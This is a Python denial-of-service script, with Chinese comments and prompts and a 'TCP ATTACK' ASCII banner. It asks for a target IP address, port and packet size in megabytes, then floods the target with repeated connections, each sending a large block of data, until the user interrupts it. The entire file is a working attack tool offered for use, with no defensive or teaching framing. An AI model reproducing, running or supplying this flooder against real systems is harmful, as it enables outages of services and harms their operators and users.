import socket
import time
import sys

def tcp_flood(target_ip, target_port, packet_size_mb):
    """
    TCP Flood攻击函数
    :param target_ip: 目标IP地址
    :param target_port: 目标端口
    :param packet_size_mb: 每个TCP包的大小(MB)
    """
    try:
        # 将MB转换为字节
        packet_size = int(packet_size_mb * 1024 * 1024)
        
        # 创建随机数据
        data = b'X' * packet_size
        
        # 创建TCP socket
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        
        # 设置超时时间
        s.settimeout(3)
        
        print(f"[*] 正在攻击 {target_ip}:{target_port} 数据包大小: {packet_size_mb}MB")
        
        packet_count = 0
        start_time = time.time()
        
        try:
            while True:
                try:
                    # 尝试连接
                    s.connect((target_ip, target_port))
                    
                    # 发送数据
                    s.send(data)
                    
                    packet_count += 1
                    elapsed_time = time.time() - start_time
                    
                    # 每秒更新一次统计信息
                    if elapsed_time >= 1:
                        print(f"\r[*] 已发送 {packet_count} 个数据包 | {packet_count/elapsed_time:.2f} 包/秒", end="")
                        start_time = time.time()
                        packet_count = 0
                    
                    # 关闭连接
                    s.close()
                    
                    # 重新创建socket
                    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    s.settimeout(3)
                    
                except socket.error as e:
                    print(f"\n[!] 连接错误: {e}")
                    s.close()
                    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    s.settimeout(3)
                    time.sleep(1)
                    
        except KeyboardInterrupt:
            print("\n[*] 用户中断攻击")
            
    except Exception as e:
        print(f"[!] 发生错误: {e}")
    finally:
        s.close()

def main():
    print("""
    ████████╗ ██████╗██████╗     █████╗ ████████╗████████╗ █████╗  ██████╗██╗  ██╗
    ╚══██╔══╝██╔════╝██╔══██╗   ██╔══██╗╚══██╔══╝╚══██╔══╝██╔══██╗██╔════╝██║ ██╔╝
       ██║   ██║     ██████╔╝   ███████║   ██║      ██║   ███████║██║     █████╔╝ 
       ██║   ██║     ██╔═══╝    ██╔══██║   ██║      ██║   ██╔══██║██║     ██╔═██╗ 
       ██║   ╚██████╗██║        ██║  ██║   ██║      ██║   ██║  ██║╚██████╗██║  ██╗
       ╚═╝    ╚═════╝╚═╝        ╚═╝  ╚═╝   ╚═╝      ╚═╝   ╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝
    """)
    
    try:
        # 获取用户输入
        target_ip = input("请输入目标IP地址: ")
        target_port = int(input("请输入目标端口: "))
        packet_size_mb = float(input("请输入TCP包大小(MB): "))
        
        # 验证输入
        if not target_ip or target_port < 1 or target_port > 65535 or packet_size_mb <= 0:
            print("[!] 输入无效")
            return
            
        # 开始攻击
        tcp_flood(target_ip, target_port, packet_size_mb)
        
    except ValueError:
        print("[!] 输入无效，请确保端口是数字，包大小是数字")
    except Exception as e:
        print(f"[!] 发生错误: {e}")

if __name__ == "__main__":
    main()
